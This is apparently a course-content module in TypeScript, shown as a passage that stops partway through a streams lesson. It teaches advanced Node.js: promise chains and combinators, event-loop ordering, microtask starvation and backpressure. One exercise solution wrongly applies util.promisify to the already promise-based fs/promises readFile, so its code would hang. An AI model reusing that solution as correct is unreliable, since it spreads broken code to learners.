import type { Lesson, Quiz } from "@/types";
import { OFFICIAL, docs, lessonResources, ytSearch } from "../helpers/resources";

export const meta = {
  id: "p2-m1",
  slug: "advanced-javascript-and-nodejs",
  title: "Advanced JavaScript & Node.js",
  description:
    "Production-grade JavaScript on the server: promise chains and combinators, the exact ordering rules of the event loop, streams with backpressure, buffers, event emitters, error propagation and custom errors, process signals and graceful shutdown, child processes, worker threads, memory, npm workflows, reusable modules, TypeScript configuration and how to structure a growing codebase.",
  phaseId: "phase-2",
  order: 1,
};

const shared = {
  phaseId: "phase-2",
  moduleId: "p2-m1",
  difficulty: "intermediate",
} as const;

export const lessons: Lesson[] = [
  {
    ...shared,
    id: "p2m1-advanced-promises",
    slug: "advanced-promises",
    title: "Advanced Promises",
    description:
      "How rejections travel through a chain, what finally really does, promisifying callback APIs, flattening nested promises and eliminating unhandled rejections.",
    order: 1,
    estimatedMinutes: 20,
    tags: ["promises", "async", "error-handling"],
    prerequisites: ["p1m2-promises", "p1m2-async-await", "p1m2-callbacks"],
    relatedTopics: ["p2m1-promise-combinators", "p2m1-error-propagation", "p1m4-async-programming"],
    learningObjectives: [
      "Trace how a rejection propagates through then/catch/finally and where propagation stops",
      "Promisify a callback API and sequence work without nesting promise pyramids",
      "Explain why unhandled rejections crash modern Node.js and how to prevent them",
      "Use finally for cleanup that must run on both the success and failure paths",
    ],
    simpleExplanation:
      "A promise is a one-shot value that may arrive later, and every .then/.catch/.finally registers a reaction that runs once the promise settles. Errors behave like exceptions inside a chain: throwing in any reaction rejects the promise the next handler will see, and a rejection skips every success handler until a catch handles it. Once a catch runs, the chain is healthy again — everything after it executes as normal success.",
    detailedContent: `
Every \`.then\` takes up to two functions: a fulfillment handler and a rejection handler. If you pass only the first, rejections **pass through** untouched until they meet a catch. Three things reject the next promise in a chain:

1. The handler throws (\`throw new Error("x")\`).
2. The handler returns an already-rejected promise.
3. The handler returns a thenable that later rejects — the chain **adopts** its state, so \`await\` and \`return somePromise\` are interchangeable.

A \`.catch(fn)\` is just \`.then(undefined, fn)\`: it **recovers**. Recovery means the rejection no longer travels — the value it returns becomes the fulfillment value of the whole chain, and every later \`.then\` runs in success mode. If your recovery value is garbage, the next handler fails with a confusing error far from the cause; if the catch itself throws, the new error keeps propagating.

\`.finally(fn)\` runs on **both** outcomes and does not change them (unless \`fn\` throws or returns a rejected promise — then it overrides the result). That makes it the right place for closing resources, clearing timers and logging "this attempt finished".

**Unhandled rejections** are rejected promises with no handler by the time the event loop finishes a turn. Node fires the \`unhandledRejection\` process event, and with the default \`--unhandled-rejections=throw\` mode (since Node 15) that is raised as an uncaught exception — your server exits. The usual culprits are fire-and-forget async calls in request handlers and promisified callbacks whose promise is never awaited or caught.

For callback code, \`util.promisify\` converts an error-first callback into a promise, so a flat sequence of \`await\`s replaces deeply nested callbacks. Returning a promise from a \`.then\` flattens automatically — never \`await\` the value you are about to return.
    `,
    howItWorks: `
A promise is a small state machine: pending, then fulfilled with a value or rejected with a reason, and it can never change again. Each \`.then\` attaches a pair of reaction records to the current promise. When it settles, Node queues a **microtask** job for every attached reaction, in registration order. Each job either calls your function or — if you passed no handler for that outcome — forwards the value/rejection to the promise that \`.then\` returned.

Rejection propagation is therefore just forwarding: value → next fulfillment handler; rejection → next rejection handler. The first handler that "handles" it stops the forwarding. If no reaction ever handles a rejection, the promise remains marked unhandled and Node reports it after the current turn — which is why attaching \`.catch\` later in the same tick still counts as handled.
    `,
    codeExamples: [
      {
        title: "Propagation, recovery and finally in one chain",
        language: "js",
        code: `import { readFile } from "node:fs/promises";

function readJson(path) {
  return readFile(path, "utf8").then(
    (text) => JSON.parse(text),
    (err) => {
      if (err.code === "ENOENT") return { mode: "defaults" }; // recover
      throw err; // unknown failures keep propagating
    },
  );
}

readJson("/etc/app/config.json")
  .then((cfg) => {
    if (!cfg.mode) throw new Error("config has no mode"); // rejects the next promise
    return cfg.mode;
  })
  .then((mode) => console.log("mode:", mode))
  .catch((err) => console.error("failed:", err.message)) // propagation stops here
  .finally(() => console.log("attempt finished")); // runs on BOTH paths`,
        description:
          "The two-argument .then converts only ENOENT into a default value; every other read error, plus the missing-mode throw, skips the success handler and lands in .catch. .finally runs no matter which path won.",
      },
      {
        title: "Promisify a callback API without nesting",
        language: "js",
        code: `import { promisify } from "node:util";
import { execFile } from "node:child_process";

// error-first callback -> promise
const run = promisify(execFile);

async function versions(tools) {
  const out = [];
  for (const tool of tools) {
    // one level deep, always — no pyramid, no manual unwrap
    const { stdout } = await run(tool.cmd, tool.args);
    out.push({ cmd: tool.cmd, version: stdout.trim() });
  }
  return out;
}

versions([
  { cmd: "node", args: ["--version"] },
  { cmd: "npm", args: ["--version"] },
]).then(console.log);

// Fire-and-forget that can never become an unhandled rejection:
function safe(fn) {
  return fn().catch((err) => console.error("background task failed:", err));
}`,
        description:
          "promisify handles the (err, value) convention for you. The safe() helper is the pattern to adopt for every intentionally background async task: same execution, but the rejection always has a home.",
      },
    ],
    commonMistakes: [
      "Creating a promise and never handling its rejection — with the default unhandled-rejections mode a single ignored failure takes the whole process down.",
      "Believing a .catch at the end of a chain is too late: attaching it in the same tick is fine, but attaching it after an unrelated await may already have triggered unhandledRejection.",
      "Recovering in a catch with a bogus value (empty array, undefined) and letting a downstream TypeError obscure the real cause.",
      "Nesting promisified calls (await f(await g())) instead of sequencing them — the nesting hides which step failed and breaks early-exit logic.",
    ],
    bestPractices: [
      "Prefer async/await with try/catch/finally for sequential code; keep .then chains for short fan-in/fan-out pipelines.",
      "Put cleanup in finally so the success and failure branches cannot drift apart.",
      "Give every fire-and-forget promise a .catch that logs (or route it through a small safe() helper).",
      "Rethrow unknown errors from recovery handlers so real failures are never swallowed.",
    ],
    realWorldUseCases: [
      "Wrapping a legacy callback-based SDK (payments, DNS, filesystem) so the rest of the service can use await.",
      "Turning expected failures like ENOENT or ECONNRESET into typed fallbacks at one boundary instead of scattering null checks.",
    ],
    resources: lessonResources({
      official: {
        title: "MDN — Promise",
        url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise",
        description: "Reference for promise state, chaining, adoption and rejection semantics.",
      },
      videos: [
        {
          query: "javascript promises error handling finally promisify",
          description: "Walkthroughs of rejection propagation, finally and promisify with runnable examples.",
          estimatedDuration: "15–25 min",
        },
      ],
    }),
    exercises: [
      {
        id: "ex-p2m1-promise-chain",
        title: "Predict and repair the chain",
        prompt:
          "Given: `Promise.reject(new Error('a')).then(() => console.log('ok')).catch((e) => { console.log(e.message); throw new Error('b'); }).finally(() => console.log('cleanup')).catch((e) => console.log('final:', e.message));` — write down the exact console output before running it, then run it and explain each line. Finally remove the last .catch and observe what happens to the process.",
        difficulty: "intermediate",
        estimatedMinutes: 20,
        hints: [
          "A rejection skips .then fulfillment handlers until it meets a .catch.",
          "Throwing inside a catch rejects the promise that .finally and the next .catch observe.",
        ],
      },
      {
        id: "ex-p2m1-promisify",
        title: "Promisify a real callback API",
        prompt:
          "Pick any error-first callback API in the standard library (fs.readFile, dns.lookup, zlib.gzip) and: (1) promisify it with util.promisify, (2) call it three times sequentially in an async function with try/catch/finally, (3) prove that a rejection is not swallowed by temporarily removing your catch and watching Node exit with ERR_UNHANDLED_REJECTION.",
        difficulty: "intermediate",
        estimatedMinutes: 30,
        hints: [
          "util.promisify expects the callback to be the last argument and to follow (err, value).",
          "Run with a plain `node script.js` — the default unhandled-rejections mode is what crashes.",
        ],
        solution: `import { promisify } from "node:util";
import { readFile } from "node:fs/promises";

const read = promisify(readFile);

async function main() {
  try {
    for (const path of ["a.txt", "missing.txt", "b.txt"]) {
      const buf = await read(path);
      console.log(path, buf.length, "bytes");
    }
  } catch (err) {
    console.error("read failed:", err.code, err.message);
  } finally {
    console.log("attempt finished");
  }
}

main();`,
        solutionLanguage: "js",
      },
    ],
    projectIds: ["p2-task-api"],
    quizId: "quiz-p2-m1",
  },
  {
    ...shared,
    id: "p2m1-promise-combinators",
    slug: "promise-combinators",
    title: "Promise Combinators",
    description:
      "Promise.all, allSettled, race and any: the exact settle semantics of each, their failure modes, and when each one is the correct tool.",
    order: 2,
    estimatedMinutes: 18,
    tags: ["promises", "concurrency", "async"],
    prerequisites: ["p2m1-advanced-promises"],
    relatedTopics: ["p2m1-advanced-promises", "p2m1-event-loop-order", "p1m2-promises"],
    learningObjectives: [
      "State the settle semantics of Promise.all, allSettled, race and any",
      "Choose the right combinator for fan-out, partial-failure reporting, timeouts and fallbacks",
      "Explain why losing promises keep running after a combinator has settled",
      "Combine a combinator with AbortController and timeouts for production-grade concurrency",
    ],
    simpleExplanation:
      "Combinators take an array of promises and return a single promise with a defined rule. Promise.all fails fast when any input rejects; allSettled always reports every outcome; race settles with the first promise to settle (success OR failure); any resolves with the first success and only fails when everything failed. Picking the wrong one is how 'optional' features turn into outages.",
    detailedContent: `
| Combinator | Resolves with | Rejects when | Typical use |
| --- | --- | --- | --- |
| \`Promise.all\` | array of values, in input order | ANY input rejects (first rejection wins) | every input must succeed |
| \`Promise.allSettled\` | array of \`{ status, value?, reason? }\` | never | batch jobs, dashboards |
| \`Promise.race\` | first settlement (fulfilled OR rejected) | first rejection, if that is first | timeouts |
| \`Promise.any\` | first fulfillment | ALL inputs reject (\`AggregateError\`) | fallbacks, multi-region probes |

Details that bite in production:

- **Nothing is cancelled.** When all() rejects on the first failure, the other promises are still running. They may still write to the database, log errors or hold sockets. Cancellation needs AbortController passed into fetch/DB calls, not a combinator.
- **all() over an empty array resolves immediately** with \`[]\` — a dynamic fan-out that accidentally builds an empty list "succeeds" instantly.
- **race() is not 'first success'.** A fast rejection wins the race. Use any() for first-success semantics.
- **any() rejects with AggregateError**, whose \`.errors\` array holds every reason — surface those, not the wrapper, or your logs become useless.
- **Order is only guaranteed for all/allSettled.** race/any tell you *which* promise won only by value, never by index.
- Inputs start **eagerly** the moment you call the combinator. Building \`Array.from({length: 10000}, (_, i) => work(i))\` starts ten thousand tasks at once — bound the concurrency.

A timeout is a race, but a correct one also clears its timer and aborts the loser.
    `,
    howItWorks: `
Each combinator synchronously walks the input array and attaches fulfillment and rejection reactions to every promise, keeping a small bookkeeping object: a result array, a counter, and a \`settled\` flag. When a promise settles, the combinator updates the bookkeeping and checks its rule. The first update that satisfies the rule (all fulfilled / any fulfilled / first settlement / all rejected) settles the returned promise and flips the flag, so later events are ignored. The underlying promises keep executing — the combinator only stops *observing* them.
    `,
    codeExamples: [
      {
        title: "Fan-out with all — every input must succeed",
        language: "js",
        code: `async function loadDashboard(api, userId) {
  // All three start immediately; the first rejection wins and the others keep running.
  const [user, posts, prefs] = await Promise.all([
    api.get("/users/" + userId),
    api.get("/posts?author=" + userId),
    api.get("/prefs/" + userId),
  ]);
  return { user, posts, prefs };
}

async function healthReport(checks) {
  // Partial failure is acceptable — report every dependency.
  const settled = await Promise.allSettled(checks.map((c) => c()));
  return settled.map((s, i) => ({
    name: checks[i].name,
    ok: s.status === "fulfilled",
    detail: s.status === "fulfilled" ? s.value : s.reason.message,
  }));
}`,
        description:
          "all() when one failed dependency means the page cannot render at all; allSettled() when the page should still render and show which dependency is down.",
      },
      {
        title: "Timeouts and first-success without losing work",
        language: "js",
        code: `import { setTimeout as delay } from "node:timers/promises";

async function withTimeout(promise, ms, label) {
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), ms).unref?.() ?? undefined;
  try {
    return await Promise.race([
      promise,
      delay(ms, undefined, { signal: ctrl.signal }).then(() => {
        throw new Error(label + " timed out after " + ms + "ms");
      }),
    ]);
  } finally {
    clearTimeout(timer);
  }
}

async function firstRegionSucceeds(regions) {
  try {
    return await Promise.any(regions.map((r) => r.ping()));
  } catch (err) {
    // AggregateError — log every reason, not just the wrapper
    for (const reason of err.errors ?? []) console.error("region failed:", reason.message);
    throw err;
  }
}`,
        description:
          "race() builds timeouts; pair it with clearTimeout/AbortController so the loser stops consuming resources. any() is the multi-region / multi-provider fallback; AggregateError.errors is where the real diagnostics live.",
      },
    ],
    commonMistakes: [
      "Assuming Promise.all cancels the remaining work after the first rejection — it does not; guard side effects with AbortSignal or idempotent operations.",
      "Using Promise.race for 'first success' — a fast rejection wins; Promise.any is the first-success combinator.",
      "Passing an empty array to Promise.all in dynamic fan-out, turning an accidental empty list into an instant success.",
      "Starting one task per item for a 50,000-row import — the combinator is not the problem, unbounded concurrency is.",
    ],
    bestPractices: [
      "Use all() only when every input is required; use allSettled() when partial results are meaningful and must be reported.",
      "Pair every timeout race with clearTimeout and, where supported, an AbortController so the loser actually stops.",
      "Bound fan-out concurrency (chunking or a tiny p-limit style helper) instead of all() over thousands of items.",
      "Log AggregateError.errors per item before failing — operators need the individual causes.",
    ],
    realWorldUseCases: [
      "Health dashboards that must show each dependency's status instead of a single boolean.",
      "Media pipelines where one failed asset must not abort the rest of the batch.",
    ],
    resources: [
      docs(
        "MDN — Promise",
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise",
        "Reference covering all, allSettled, race and any, including AggregateError behaviour.",
        "en",
        "15 min",
      ),
      docs(
        "MDN — Promise.allSettled()",
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/allSettled",
        "Exact resolve shape ({status, value | reason}) and when to prefer it over all().",
        "en",
        "8 min",
      ),
      ytSearch(
        "promise all allsettled race any explained",
        "Comparative videos with runnable timing examples for each combinator.",
        "en",
        "10–20 min",
      ),
    ],
    exercises: [
      {
        id: "ex-p2m1-combinator-choice",
        title: "Pick the combinator",
        prompt:
          "For each scenario choose all, allSettled, race or any and justify in one sentence: (1) merging three config sources where all are mandatory; (2) rendering a report that shows failed rows; (3) enforcing a 2-second budget on a slow query; (4) calling two email providers and taking whichever answers first; (5) a readiness check that must fail when any dependency is down.",
        difficulty: "intermediate",
        estimatedMinutes: 20,
        hints: [
          "'Whichever answers first' with possible failures still succeeding → any.",
          "A readiness check that must fail if ANY dependency is down → all.",
        ],
      },
      {
        id: "ex-p2m1-combinator-code",
        title: "Prove the semantics",
        prompt:
          "Write a script with two promises: one fulfills after 10ms, one rejects after 5ms. Log the outcome of all, allSettled, race and any. Then add a counter incremented in finally blocks of both promises and show that after all four combinators settle, the counter proves the 'losing' promise still ran to completion.",
        difficulty: "intermediate",
        estimatedMinutes: 25,
        hints: [
          "Use setTimeout with a promise wrapper; record completions in finally.",
          "The counter is the evidence that combinators observe, they do not cancel.",
        ],
        solution: `const done = [];
const ok = new Promise((res) => setTimeout(() => { done.push("ok"); res("ok"); }, 10));
const bad = new Promise((_, rej) => setTimeout(() => { done.push("bad"); rej(new Error("bad")); }, 5));

console.log(await Promise.allSettled([ok, bad])); // never rejects — see both outcomes
console.log("after allSettled, finished work:", done); // ["bad"] (ok still pending)
console.log(await Promise.race([ok, bad]).catch((e) => "race rejected: " + e.message));
await new Promise((r) => setTimeout(r, 20));
console.log("at the end, finished work:", done); // both ran — nothing was cancelled`,
        solutionLanguage: "js",
      },
    ],
    projectIds: ["p2-task-api"],
    quizId: "quiz-p2-m1",
  },
  {
    ...shared,
    id: "p2m1-event-loop-order",
    slug: "predicting-event-loop-order",
    title: "Predicting Event Loop Order",
    description:
      "The precise execution order of synchronous code, nextTick, promise microtasks, timers, I/O and setImmediate — and how to predict output before you run it.",
    order: 3,
    estimatedMinutes: 20,
    tags: ["event-loop", "microtasks", "ordering"],
    prerequisites: ["p1m2-event-loop", "p1m4-event-loop-node"],
    relatedTopics: ["p2m1-microtasks-macrotasks", "p2m1-advanced-promises"],
    learningObjectives: [
      "Apply the loop phases (timers → pending → poll → check → close) to a piece of code",
      "Order synchronous code, nextTick, promise jobs, timers and I/O callbacks correctly",
      "Explain why setTimeout(0) and setImmediate have no guaranteed order from the main module",
      "Use ordering rules to answer 'why did B run before A?' in production logs",
    ],
    simpleExplanation:
      "Node runs your script like a queue of jobs. Everything synchronous runs first, in order. After each job, Node empties two priority queues — process.nextTick callbacks, then promise microtasks — before it looks at timers, file I/O or network callbacks. That one rule explains almost every 'out of order' log line you will ever see.",
    detailedContent: `
The loop (libuv, simplified) cycles through phases: **timers** (\`setTimeout\`/\`setInterval\` callbacks that are due) → **pending callbacks** (some I/O and system callbacks) → **poll** (retrieve and queue I/O events) → **check** (\`setImmediate\` callbacks) → **close callbacks** (\`socket.on('close')\`). Between phases, and after every single callback returns, Node runs two queues to completion:

1. The **process.nextTick** queue (Node-specific, highest priority).
2. The **microtask** queue (promise reactions, \`queueMicrotask\`).

Consequences worth memorising:

- Synchronous code always runs to completion before any callback or microtask.
- A promise \`.then\` registered before a \`setTimeout(fn, 0)\` still runs **first** — microtasks beat timers.
- \`await\` splits a function at the suspension point; everything after the await is a microtask continuation.
- **setTimeout(0) vs setImmediate** from the main module is genuinely non-deterministic (it depends on how long process startup took to reach the timers phase). Inside an I/O callback, setImmediate **always** runs first, because check follows poll in the same iteration.
- Output that depends on machine speed (file read vs 1ms timer) is not a stable contract — do not write tests that rely on it.

Long synchronous work blocks everything: no microtasks, no timers, no I/O. That is why "it's async" never excuses a 400ms JSON.parse on a shared request path.
    `,
    howItWorks: `
The call stack executes one callback at a time. When it empties, Node first drains the nextTick queue, then the microtask queue — newly queued microtasks are appended to the same drain, so a microtask that queues another microtask keeps the loop from advancing until the queue is empty. Only then does the loop select the next macrotask: an expired timer, an I/O callback waiting in the poll phase, or a setImmediate queued during check.

Because each phase processes its due callbacks in order, a timer scheduled with a 0ms delay still has to wait for the next timers phase. setImmediate was added precisely so you can say "after the current I/O operation", which is a scheduling statement, whereas setTimeout(fn, 0) is "at least 1ms from now".
    `,
    codeExamples: [
      {
        title: "Predict the output, then run it",
        language: "js",
        code: `console.log("start");

setTimeout(() => console.log("timeout"), 0);
setImmediate(() => console.log("immediate"));

Promise.resolve().then(() => console.log("promise"));
process.nextTick(() => console.log("nextTick"));

async function f() {
  console.log("inside f");
  await null;
  console.log("after await");
}
f();

console.log("end");`,
        description:
          "Order: start, inside f, end (all synchronous) → nextTick → promise → after await → then timeout/immediate in an unspecified relative order. Work it out on paper before running it: the await continuation is queued when f() suspends, so it lands after the already-queued promise job.",
      },
      {
        title: "setImmediate always wins inside an I/O callback",
        language: "js",
        code: `import fs from "node:fs";

console.log("A");
setTimeout(() => console.log("timer"), 0);
setImmediate(() => console.log("immediate (from main — order vs timer is not guaranteed)"));

fs.readFile(new URL("./package.json", import.meta.url), "utf8", () => {
  console.log("I/O done");
  setImmediate(() => console.log("immediate inside I/O — check phase, runs first"));
  setTimeout(() => console.log("timer inside I/O — next timers phase, runs second"), 0);
});
console.log("B");`,
        description:
          "From the main module the timer/immediate order is a race against startup timing. From inside an I/O callback the loop is in the poll phase, so check (immediate) runs before the next timers phase — deterministic every time.",
      },
    ],
    commonMistakes: [
      "Assuming setTimeout(fn, 0) always beats setImmediate — from the main module the order depends on process startup timing.",
      "Thinking async/await makes a function non-blocking: everything before the first await still runs synchronously on the stack.",
      "Forgetting that a .then log can appear before a timer that was scheduled earlier in the file.",
      "Asserting relative order of timer vs I/O reads in tests — that ordering is not guaranteed across machines or load.",
    ],
    bestPractices: [
      "When ordering matters for correctness, make it explicit with await sequencing rather than relying on scheduling luck.",
      "Keep every callback short; long synchronous work starves microtasks, timers and I/O alike.",
      "Use setImmediate when you mean 'after the current operation', and timers when you mean 'after a delay'.",
      "Log with a monotonic timestamp (process.hrtime.bigint()) when investigating ordering bugs across services.",
    ],
    realWorldUseCases: [
      "Explaining why a 'request finished' log appears after the response was already flushed — the two lines ran in different loop turns.",
      "Choosing where to put expensive post-response work (setImmediate, a queue, or a worker) without delaying other clients.",
    ],
    resources: [
      docs(
        "Node.js API — Timers (setTimeout, setImmediate)",
        "https://nodejs.org/api/timers.html",
        "Scheduling semantics and the documented relationship between timers and setImmediate.",
        "en",
        "12 min",
      ),
      docs(
        "MDN — Event loop",
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Event_loop",
        "The conceptual model: call stack, task queue and microtask queue.",
        "en",
        "10 min",
      ),
      ytSearch(
        "node.js event loop execution order exercises",
        "Trace-the-output drills covering sync, microtasks, timers and I/O.",
        "en",
        "15–30 min",
      ),
    ],
    exercises: [
      {
        id: "ex-p2m1-order-1",
        title: "Trace the order",
        prompt:
          "Without running it, write the exact console output of: `console.log(1); setTimeout(() => console.log(2), 10); setImmediate(() => console.log(3)); Promise.resolve().then(() => console.log(4)); process.nextTick(() => console.log(5)); queueMicrotask(() => console.log(6)); console.log(7);` Then run it and correct your answer, explaining every line in one sentence.",
        difficulty: "intermediate",
        estimatedMinutes: 20,
        hints: [
          "Synchronous prints happen before anything queued.",
          "nextTick queue drains before the promise microtask queue.",
        ],
        solution: `// Output: 1, 7, 5, 4, 6, 2, 3 (2 vs 3 is not guaranteed from the main module)
console.log(1);
setTimeout(() => console.log(2), 10);
setImmediate(() => console.log(3));
Promise.resolve().then(() => console.log(4));
process.nextTick(() => console.log(5));
queueMicrotask(() => console.log(6));
console.log(7);`,
        solutionLanguage: "js",
      },
      {
        id: "ex-p2m1-order-2",
        title: "Make the order deterministic",
        prompt:
          "Take the previous snippet and modify it so the relative order of the timer and the setImmediate is guaranteed (research: wrap one of them inside an I/O callback such as fs.readFile of any file, or inside setImmediate itself). Explain in two sentences why the wrapper changes the guarantee.",
        difficulty: "intermediate",
        estimatedMinutes: 25,
        hints: [
          "Wrapping code in setImmediate places it in the check phase of the current iteration.",
          "Inside the poll phase, check always runs before the next timers phase.",
        ],
      },
    ],
    projectIds: [],
    quizId: "quiz-p2-m1",
  },
  {
    ...shared,
    id: "p2m1-microtasks-macrotasks",
    slug: "microtasks-and-macrotasks",
    title: "Microtasks and Macrotasks",
    description:
      "The queue types in priority order — process.nextTick, promise jobs, timers, I/O — and how a microtask loop can starve a whole server.",
    order: 4,
    estimatedMinutes: 18,
    tags: ["event-loop", "microtasks", "performance"],
    prerequisites: ["p2m1-event-loop-order"],
    relatedTopics: ["p2m1-event-loop-order", "p2m1-worker-threads", "p1m4-event-loop-node"],
    learningObjectives: [
      "List the queues in priority order and say when each one drains",
      "Reproduce and explain microtask starvation",
      "Choose between process.nextTick, queueMicrotask, setImmediate and setTimeout for a given deferral",
      "Explain why starvation looks like a healthy process with100% CPU and zero errors",
    ],
    simpleExplanation:
      "A microtask is a tiny callback that must run as soon as the current job finishes, before Node looks at anything else. Timers, file reads and network events are macrotasks — the loop picks one of them per iteration. The danger is that the microtask queue must be empty before the loop advances, so a bug that keeps adding microtasks freezes everything else while the process still looks alive.",
    detailedContent: `
Priority order after the current callback returns:

1. **process.nextTick queue** — Node-specific, runs before promise microtasks.
2. **Microtask queue** — promise reactions, \`queueMicrotask\`. Both queues are drained **completely**, including anything they add, before the loop continues.
3. **Macrotasks**, one (or a batch) per loop iteration: due timers → pending I/O callbacks → setImmediate → close callbacks.

Definitions that matter:

- **Microtasks**: short, no I/O, no timers. They run on the same thread right after the current operation — ideal for "finish bookkeeping now", terrible for anything slow.
- **Macrotasks**: each waits for its phase. \`setTimeout(fn, 0)\` is clamped to at least ~1ms; \`setImmediate\` means "next check phase", which is usually what server code wants.
- **Starvation**: if a microtask schedules another microtask forever, the queue never empties, so the loop never reaches timers or poll. The process burns CPU, health checks time out, and there is no stack trace because nothing threw.

Where you see it in real code: a recursive \`then\` on a self-resolving promise, an event handler that \`postMessage\`s back and forth without a bound, or a \`while\` loop replaced with chained microtasks to "stay async".

Rule of thumb for libraries: do not use \`process.nextTick\` to defer application work — it delays promise callbacks too, and readers assume nextTick means something specific. Prefer \`setImmediate\` (macrotask, after I/O) or \`queueMicrotask\` (same family as promises) with intent.
    `,
    howItWorks: `
Under the hood both queues are arrays on the process object. When the current stack empties, Node runs nextTick callbacks one by one, then promise jobs, re-checking after each if the queues grew. Because promise reactions are scheduled by V8 as microtask jobs, \`await\` continuations live in the same queue as \`queueMicrotask\`.

Only when both queues are empty does libuv resume the loop and ask: which timer is due? which I/O events arrived? which immediates were queued during the last poll? That is why a long microtask chain is indistinguishable from a hang: the loop is alive, timers are "scheduled", they just never get their turn.
    `,
    codeExamples: [
      {
        title: "Reproduce microtask starvation",
        language: "js",
        code: `// A bounded version of the bug: timers wait until every microtask is done.
let ticks = 0;
function ping() {
  ticks += 1;
  queueMicrotask(() => {
    if (ticks < 1_000_000) ping(); // still microtask space — loop cannot advance
    else console.log("microtasks drained after", ticks, "iterations");
  });
}

setTimeout(() => console.log("timer (prints last)"), 0);
ping();`,
        description:
          "Replace the condition with true and the timer NEVER prints, the process never exits, and no error is thrown — the classic100%-CPU, zero-log production hang. Anything slower than a few milliseconds belongs in a macrotask, a queue, or a worker.",
      },
      {
        title: "Choosing the right deferral primitive",
        language: "js",
        code: `// 1) nextTick — after the current op, BEFORE promise microtasks (library semantics only)
process.nextTick(() => console.log("1 nextTick"));

// 2) queueMicrotask — same family as promise reactions
queueMicrotask(() => console.log("2 microtask"));

// 3) setImmediate — next check phase; the predictable "after current I/O" choice
setImmediate(() => console.log("3 immediate"));

// 4) setTimeout — timers phase, minimum ~1ms
setTimeout(() => console.log("4 timer"), 0);

console.log("0 sync");`,
        description:
          "Output: 0, 1, 2, then 3/4 in an unspecified order from the main module (from inside an I/O callback, 3 comes before 4). Pick nextTick only when you must beat promise callbacks — otherwise you are changing priority for everyone else.",
      },
    ],
    commonMistakes: [
      "Using process.nextTick inside library code to 'run later', which delays every promise in the process by one extra turn.",
      "Assuming setTimeout(fn, 0) is 'as fast as possible' — it waits for the next timers phase and is clamped to ~1ms.",
      "Writing a recursive microtask (or endlessly resolving promise chain) that pegs a CPU core while requests time out.",
      "Believing microtasks run in parallel — they run one after another on the same thread as the callback that scheduled them.",
    ],
    bestPractices: [
      "Prefer setImmediate for 'after the current operation' in server code; reserve nextTick for library-level guarantees.",
      "Keep microtasks to bookkeeping; anything slower belongs in a timer, a job queue, or a worker thread.",
      "Monitor event-loop delay (a histogram of lag) so starvation shows up as a metric before users report timeouts.",
      "Use plain await sequencing when you only need ordering — manual queueing adds priority surprises.",
    ],
    realWorldUseCases: [
      "Real-time (SSE/WebSocket) servers that appear frozen because a per-message handler chains microtasks without bound.",
      "Libraries that used nextTick for 'safety' and cause request latency spikes that only appear under load.",
    ],
    resources: [
      docs(
        "Node.js API — process.nextTick() and queueMicrotask guidance",
        "https://nodejs.org/api/process.html",
        "Includes the official comparison of queueMicrotask vs process.nextTick.",
        "en",
        "15 min",
      ),
      docs(
        "MDN — queueMicrotask()",
        "https://developer.mozilla.org/en-US/docs/Web/API/QueueMicrotask",
        "What a microtask is and when it runs relative to the current task.",
        "en",
        "6 min",
      ),
      ytSearch(
        "microtask vs macrotask starvation node",
        "Visual demos of queue draining and starvation scenarios.",
        "en",
        "10–20 min",
      ),
    ],
    exercises: [
      {
        id: "ex-p2m1-starve",
        title: "Break a server on purpose",
        prompt:
          "Start a plain http server and add a route /hog that, on request, runs a recursive queueMicrotask chain of 5 million iterations (or a while loop that never yields). Observe: the route responds eventually, but concurrent requests time out and no error is logged. Then fix it with setImmediate yielding every N iterations and compare event-loop delay.",
        difficulty: "intermediate",
        estimatedMinutes: 30,
        hints: [
          "Issue two concurrent curl requests while /hog is running.",
          "Measure with a small setInterval logging process.hrtime.bigint() deltas.",
        ],
      },
      {
        id: "ex-p2m1-deferral",
        title: "Classify the deferrals",
        prompt:
          "For each requirement write the one-line call you would use and justify: (1) finish logging before promise callbacks run; (2) run after the current I/O callback without waiting for timers; (3) run at least 50ms later; (4) run right after the current synchronous execution in a way that matches promise timing.",
        difficulty: "intermediate",
        estimatedMinutes: 15,
        hints: [
          "One of these is process.nextTick — use it only when beating promises matters.",
          "setImmediate is the 'next check phase' answer.",
        ],
      },
    ],
    projectIds: [],
    quizId: "quiz-p2-m1",
  },
  {
    ...shared,
    id: "p2m1-streams-backpressure",
    slug: "streams-and-backpressure",
    title: "Streams and Backpressure",
    description:
      "highWaterMark, write() returning false, the drain event, pipeline() vs pipe(), and why naive piping silently loses data in production.",
    order: 5,
    estimatedMinutes: 22,
    tags: ["streams", "backpressure", "io"],
    prerequisites: ["p1m4-streams", "p1m4-fs-module"],
    relatedTopics: ["p2m1-buffer-handling", "p1m4-buffers", "p1m4-http-module"],
    learningObjectives: [
      "Explain backpressure in terms of highWaterMark, write() returning false and the drain event",
      "Use stream/promises pipeline() so completion, errors and cleanup all propagate",
      "State exactly why src.pipe(dst) alone fails in production",
      "Design a copy path whose memory stays flat when the consumer is slower than the producer",
    ],
    simpleExplanation:
      "Streams move data in chunks through a small internal buffer. When the buffer is full, write() returns false — that is backpressure: 'slow down, I am behind'. Good code stops feeding the stream until the 'drain' event says it has caught up. The pipeline() helper does this bookkeeping for you and destroys every stream if anything fails, which naive .pipe() does not.",
    detailedContent: `
Every stream has a **highWaterMark** — the number of bytes (or objects in objectMode) it is willing to buffer before it signals backpressure. Defaults: 16 KiB for most byte streams (file read streams use 64 KiB, file write streams 16 KiB) and 16 objects for objectMode streams.

**Reading side**: a readable pauses automatically when its buffer is full; the flow resumes when the consumer asks for more. **Writing side**: \`write(chunk)\` returns \`false\` when the writable's buffer has reached highWaterMark. The chunk is NOT lost — it is buffered — but continuing to write grows memory until the process dies.

**Why \`src.pipe(dst)\` is not production code**:

- Errors are not forwarded. A read error mid-copy leaves a half-written destination file, and with no \`'error'\` listener Node throws \`ERR_STREAM_PREMATURE_CLOSE\` or an unhandled 'error' event and exits.
- It returns the destination, not a promise, so you cannot \`await\` completion — tests race the process exit, logs appear after the response.
- When the destination errors, the source is not destroyed: the read continues, wasting I/O and leaking file descriptors.
- Cleanup (unpipe, close, error listeners) is manual and easy to forget when a third stream joins.

**pipeline()** (from \`node:stream/promises\`) wires backpressure for you, destroys every stream on the first error, and resolves when the destination finishes — one \`await\` covers success and failure.

